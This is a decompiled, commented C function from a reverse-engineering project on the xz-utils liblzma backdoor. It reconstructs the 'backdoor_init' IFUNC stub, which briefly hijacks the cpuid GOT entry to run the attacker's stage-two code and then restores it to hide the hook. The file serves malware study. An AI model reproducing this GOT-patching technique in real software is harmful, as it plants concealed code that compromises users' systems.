// /home/kali/xzre-ghidra/xzregh/10A794_backdoor_init.c
// Function: backdoor_init @ 0x10A794
// Calling convention: __stdcall
// Prototype: void * __stdcall backdoor_init(elf_entry_ctx_t * state, u64 * caller_frame)


/*
 * AutoDoc: IFUNC stub that patches the cpuid GOT entry long enough to run `backdoor_init_stage2`. It normalises the GOT bookkeeping
 * via `init_elf_entry_ctx`, derives the cpuid slot address using the embedded relocation constants, temporarily replaces the slot
 * with the attacker’s resolver, issues the genuine cpuid to keep glibc happy, and finally restores the original target so future
 * cpuid calls enter the newly installed hook path.
 */
#include "xzre_types.h"

void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)

{
  long cpuid_slot_original;
  const backdoor_cpuid_reloc_consts_t *cpuid_reloc_consts;
  void *tls_got_base;
  long *cpuid_got_slot;
  
  (state->got_ctx).got_base_offset = (ptrdiff_t)state;
  // AutoDoc: Normalise the resolver context so we know the GOT base, cpuid slot, and relocation constants before patching anything.
  init_elf_entry_ctx(state);
  cpuid_reloc_consts = PTR__Llzma_block_buffer_decode_0_0010e000;
  // AutoDoc: Stash the resolver frame pointer so stage two can restore the cpuid GOT slot once it finishes patching.
  state->resolver_frame = (u64 *)(state->got_ctx).cpuid_got_slot;
  tls_got_base = (void *)((long)state->cpuid_random_symbol_addr - (state->got_ctx).got_base_offset);
  (state->got_ctx).tls_got_entry = tls_got_base;
  // AutoDoc: Use the baked-in relocation deltas to compute the cpuid GOT slot we need to hijack.
  cpuid_got_slot = (long *)((long)tls_got_base + *(long *)(cpuid_reloc_consts + 8));
  (state->got_ctx).cpuid_got_slot = cpuid_got_slot;
  if (cpuid_got_slot != (long *)0x0) {
    // AutoDoc: Swap the slot to `backdoor_init_stage2`, call the genuine cpuid resolver, then restore the original target so future calls look legitimate.
    cpuid_slot_original = *cpuid_got_slot;
    *cpuid_got_slot = (long)tls_got_base + *(long *)(cpuid_reloc_consts + 0x10);
    tls_got_base = (void *)(*(code *)PTR__cpuid_gcc_0010e008)();
    *cpuid_got_slot = cpuid_slot_original;
  }
  return tls_got_base;
}

